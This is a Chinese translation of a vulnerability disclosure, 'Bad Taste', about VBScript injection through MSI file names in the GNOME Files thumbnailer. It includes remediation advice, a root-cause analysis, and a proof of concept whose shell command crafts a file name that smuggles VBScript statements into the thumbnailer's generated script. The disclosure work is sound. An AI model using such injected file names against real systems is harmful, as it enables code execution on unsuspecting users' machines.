> 原文链接: https://www.anquanke.com//post/id/86476 


# 【技术分享】通过GNOME Files的缩略图实现VBScript注入


                                阅读量   
                                **84343**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：dieweltistgarnichtso.net
                                <br>原文地址：[http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html](http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t016ba20cac7eb6d827.jpg)](https://p0.ssl.qhimg.com/t016ba20cac7eb6d827.jpg)

****

译者：[myswsun](http://bobao.360.cn/member/contribute?uid=877906634)

预估稿费：50RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**0x00 前言**

****

在GNOME Files文件管理器中针对MSI文件的缩略图可以导致执行任意VBScript。我将这个漏洞命名为“Bad Taste”。它的logo是变色的Wine的logo。

[![](https://p3.ssl.qhimg.com/t01a4b2dbb4cf5dad50.png)](https://p3.ssl.qhimg.com/t01a4b2dbb4cf5dad50.png)

 

**0x01 针对用户的补救措施**

****

删除/usr/share/thumbnails下的所有文件。不要使用GNOME Files。卸载任何能将部分文件名作为代码的软件。

<br>

**0x02 针对开发者的补救措施**

****

不要使用有bug的ad-hoc解析器来解析文件。处理他们时要充分验证输入。不要使用模版，而是使用unparsers。可以阅读这个LANGSEC。

<br>

**0x03 安装依赖**

****

在Debain GNU/Linux上，安装gnome-exe-thumbnailer，nautilus和wixl。其中Wixl包用于创建MSI文件以便触发漏洞。如果PoC无法生效，则安装winetricks并运行winetricks wsh56来更新Windows Script Host。

<br>

**0x04 创建MSI文件**

****

创建包含下面内容的文件poc.xml:

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"&gt;
&lt;Product Version="1.0"/&gt;
&lt;/Wix&gt;
```

执行下面的Bourne shell code：

```
wixl -o poc.msi poc.xml
cp poc.msi "poc.msi",0):Set fso=CreateObject("Scripting.FileSystemObject"):Set poc=fso.CreateTextFile("badtaste.txt")'.msi"
```

**<br>**

**0x05 触发执行**

****

启动GNOME文件管理器，导航到包含MSI文件的文件夹。会出现一个badtaste.txt的空文件。

<br>

**0x06 细节分析**

****

很多文件管理器都会根据文件格式生成缩略图。在GNU/Linux上，为了找到一个程序能针对特定文件格式生成缩略图，文件管理器GNOME Files使用缩略图配置文件/usr/share/thumbnailers。安装Debian包gnome-exe-thumbnailer后，/usr/share/thumbnailers/exe-dll-msi.thumbnailer包含下面的文本：

```
[Thumbnailer Entry]
TryExec=/usr/bin/gnome-exe-thumbnailer
Exec=/usr/bin/gnome-exe-thumbnailer %i %o %u
MimeType=application/x-ms-dos-executable;application/x-msdownload;application/x-msi;application/x-ms-shortcut
```

这意味着，当一个微软Windows可执行文件（EXE），安装程序（MSI），库（DLL）或快捷方式（LNK）的图标显示时，GNOME Files会调用/usr/bin/gnome-exe-thumbnailer来从文件中提取内嵌图标，或者根据文件类型提供图片。Shell脚本/usr/bin/gnome-exe-thumbnailer包含下面的代码：

[![](https://p1.ssl.qhimg.com/t01280414762b397df7.png)](https://p1.ssl.qhimg.com/t01280414762b397df7.png)



**总结**

这个代码创建了一个脚本，其中包含了要显示的缩略图的文件名，并使用Wine执行它， 而并不是通过解析MSI文件来得到它的版本号。这个脚本是使用模版创建的，这样就可以在文件名中内嵌VBScript，并触发它的执行。

因为只有一行VBScript，所以通过文件名注入的语句必须用冒号隔开。而单引号可以作为一行的注释。
